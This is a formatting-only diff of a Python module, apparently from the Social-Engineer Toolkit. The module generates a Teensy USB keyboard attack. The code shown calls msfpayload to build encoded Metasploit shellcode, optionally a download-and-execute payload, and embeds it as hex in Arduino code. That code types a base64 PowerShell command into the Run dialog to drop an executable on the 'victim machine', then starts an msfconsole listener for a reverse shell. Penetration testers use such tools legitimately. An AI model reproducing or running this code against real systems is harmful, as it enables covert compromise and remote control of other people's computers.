@@ -1,6 +1,6 @@
 #!/usr/bin/python
 import binascii,base64,sys,os,random,string,subprocess,socket
-from src.core.setcore import *    
+from src.core.setcore import *
 from src.core.dictionaries import *
 from src.core.menu.text import *
 
@@ -62,7 +62,7 @@ This program will take shellexeccode which is converted to hexadecimal and
 place it onto a victim machine through hex to binary conversion via powershell.
 
 After the conversion takes place, Alphanumeric shellcode will then be injected
-straight into memory and the stager created and shot back to you. 
+straight into memory and the stager created and shot back to you.
 """
 
 # if we dont detect metasploit
@@ -71,13 +71,13 @@ if not os.path.isfile(msf_path): sys.exit("\n[!] Your no gangster... Metasploit 
 # if we hit here we are good since msfpayload is installed
 ###################################################
 #        USER INPUT: SHOW PAYLOAD MENU 2          #
-###################################################   
+###################################################
 
 show_payload_menu2 = create_menu(payload_menu_2_text, payload_menu_2)
 payload=(raw_input(setprompt(["14"], "")))
 
-if payload == "exit" : 
-        exit_set()
+if payload == "exit" :
+    exit_set()
 
 # if its default then select meterpreter
 if payload == "" : payload="2"
@@ -88,47 +88,47 @@ payload=ms_payload(payload)
 # if we're downloading and executing a file
 url = ""
 if payload == "windows/download_exec":
-        url = raw_input(setprompt(["6"], "The URL with the payload to download and execute"))        
-        url = "set URL " + url
+    url = raw_input(setprompt(["6"], "The URL with the payload to download and execute"))
+    url = "set URL " + url
 
 # try except for Keyboard Interrupts
 try:
-        # grab port number
-        while 1:
-                port = raw_input(setprompt(["6"], "Port to listen on [443]"))
-                # assign port if enter is specified
-                if port == "": port = 443
-                try:
-                        # try to grab integer port
-                        port = int(port)
-                        # if we aren't using a valid port
-                        if port >= 65535:
-                                # trigger exception
-                                port = "dfds"
-                                port = int(port)
-                        break
+    # grab port number
+    while 1:
+        port = raw_input(setprompt(["6"], "Port to listen on [443]"))
+        # assign port if enter is specified
+        if port == "": port = 443
+        try:
+            # try to grab integer port
+            port = int(port)
+            # if we aren't using a valid port
+            if port >= 65535:
+                # trigger exception
+                port = "dfds"
+                port = int(port)
+            break
 
-                # if we bomb out then loop through again
-                except: 
-                        print "   [!] Not a valid port number, try again."
-                        # pass through
-                        pass
+        # if we bomb out then loop through again
+        except:
+            print "   [!] Not a valid port number, try again."
+            # pass through
+            pass
 
 # except keyboardintterupts here
 except KeyboardInterrupt:
-        print """
-        .-. .-. . . .-. .-. .-. .-. .-.   .  . .-. .-. .-.
-        |.. |-| |\| |.. `-.  |  |-  |(    |\/| | | |  )|-
-        `-' ` ' ' ` `-' `-'  '  `-' ' '   '  ` `-' `-' `-'
-                                                   disabled.\n"""
+    print """
+    .-. .-. . . .-. .-. .-. .-. .-.   .  . .-. .-. .-.
+    |.. |-| |\| |.. `-.  |  |-  |(    |\/| | | |  )|-
+    `-' ` ' ' ` `-' `-'  '  `-' ' '   '  ` `-' `-' `-'
+                                               disabled.\n"""
 
-        sys.exit("\n[!] Control-C detected. Bombing out. Later Gangster...\n\n")
+    sys.exit("\n[!] Control-C detected. Bombing out. Later Gangster...\n\n")
 
 print "   [*] Generating alpha_mixed shellcode to be injected after shellexec has been deployed on victim..."
 # grab msfpayload alphanumeric shellcode to be inserted into shellexec
 proc = subprocess.Popen("msfpayload %s EXITFUNC=thread LHOST=%s LPORT=%s %s R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX" % (payload,ipaddr,port,url), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 # read in stdout which will be our alphanumeric shellcode
-alpha_payload = proc.stdout.read() 
+alpha_payload = proc.stdout.read()
 # generate a random filename this is going to be needed to read 150 bytes in at a time
 random_filename = generate_random_string(10,15)
 # prep a file to write
@@ -150,7 +150,7 @@ output_variable = "/* Teensy Hex to File Created by Josh Kelley (winfang) and Da
 
 # powershell command here, needs to be unicoded then base64 in order to use encodedcommand
 powershell_command = unicode("$s=gc \"$HOME\\AppData\\Local\\Temp\\%s\";$s=[string]::Join('',$s);$s=$s.Replace('`r',''); $s=$s.Replace('`n','');$b=new-object byte[] $($s.Length/2);0..$($b.Length-1)|%%{$b[$_]=[Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes(\"$HOME\\AppData\\Local\\Temp\\%s.exe\",$b)" % (random_filename,random_filename))
-        
+
 ########################################################################################################################################################################################################
 #
 # there is an odd bug with python unicode, traditional unicode inserts a null byte after each character typically.. python does not so the encodedcommand becomes corrupt
@@ -162,8 +162,8 @@ powershell_command = unicode("$s=gc \"$HOME\\AppData\\Local\\Temp\\%s\";$s=[stri
 blank_command = ""
 # loop through each character and insert null byte
 for char in powershell_command:
-        # insert the nullbyte
-        blank_command += char + "\x00"
+    # insert the nullbyte
+    blank_command += char + "\x00"
 
 # assign powershell command as the new one
 powershell_command = blank_command
@@ -172,29 +172,29 @@ powershell_command = base64.b64encode(powershell_command)
 
 # while true
 while 1:
-        # read 150 bytes in at a time
-        reading_hex = fileopen.read(space).rstrip()
-        # if its blank then break out of loop
-        if reading_hex == "": break
-        # write out counter and hex
-        output_variable += 'prog_char RevShell_%s[] PROGMEM = "%s";\n' % (counter,reading_hex)
-        # increase counter
-        counter = counter +1
+    # read 150 bytes in at a time
+    reading_hex = fileopen.read(space).rstrip()
+    # if its blank then break out of loop
+    if reading_hex == "": break
+    # write out counter and hex
+    output_variable += 'prog_char RevShell_%s[] PROGMEM = "%s";\n' % (counter,reading_hex)
+    # increase counter
+    counter = counter +1
 
 # write out the rest
 output_variable += "PROGMEM const char *exploit[] = {\n"
 # while rev_counter doesn't equal regular counter
 while rev_counter != counter:
-        output_variable+="RevShell_%s" % rev_counter
-        # incremenet counter
-        rev_counter = rev_counter + 1
-        if rev_counter == counter:
-                # if its equal that means we 
-                # are done and need to append a };
-                output_variable+="};\n"
-        if rev_counter != counter:
-                # if we don't equal, keep going
-                output_variable+=",\n"
+    output_variable+="RevShell_%s" % rev_counter
+    # incremenet counter
+    rev_counter = rev_counter + 1
+    if rev_counter == counter:
+        # if its equal that means we
+        # are done and need to append a };
+        output_variable+="};\n"
+    if rev_counter != counter:
+        # if we don't equal, keep going
+        output_variable+=",\n"
 
 # vbs filename
 vbs = generate_random_string(10,15) + ".vbs"
@@ -206,7 +206,7 @@ output_variable += ("""
 char buffer[55];
 int ledPin = 11;
 
-void setup() { 
+void setup() {
   pinMode(ledPin, OUTPUT);
 }
 void loop()
@@ -228,7 +228,7 @@ void loop()
     strcpy_P(buffer, (char*)pgm_read_word(&(exploit[i])));
     Keyboard.print(buffer);
     delay(80);
-  } 
+  }
   // ADJUST THIS DELAY IF HEX IS COMING OUT TO FAST!
   delay(5000);
   CtrlS();
@@ -277,12 +277,12 @@ Keyboard.send_now();
 }
 // Taken from IronGeek
 void CommandAtRunBar(char *SomeCommand){
-  Keyboard.set_modifier(128); 
-  Keyboard.set_key1(KEY_R); 
-  Keyboard.send_now(); 
-  Keyboard.set_modifier(0); 
-  Keyboard.set_key1(0); 
-  Keyboard.send_now(); 
+  Keyboard.set_modifier(128);
+  Keyboard.set_key1(KEY_R);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
   delay(1500);
   Keyboard.print(SomeCommand);
   Keyboard.set_key1(KEY_ENTER);
@@ -323,6 +323,5 @@ subprocess.Popen("msfconsole -r src/program_junk/answer.txt", shell=True).wait()
 print "   [*] Housekeeping old files..."
 # if our answer file is still there (which it should be), then remove it
 if os.path.isfile("src/program_junk/answer.txt"):
-        # remove the old file, no longer used once we've exited
-        subprocess.Popen("rm src/program_junk/answer.txt", shell=True).wait()
-
+    # remove the old file, no longer used once we've exited
+    subprocess.Popen("rm src/program_junk/answer.txt", shell=True).wait()
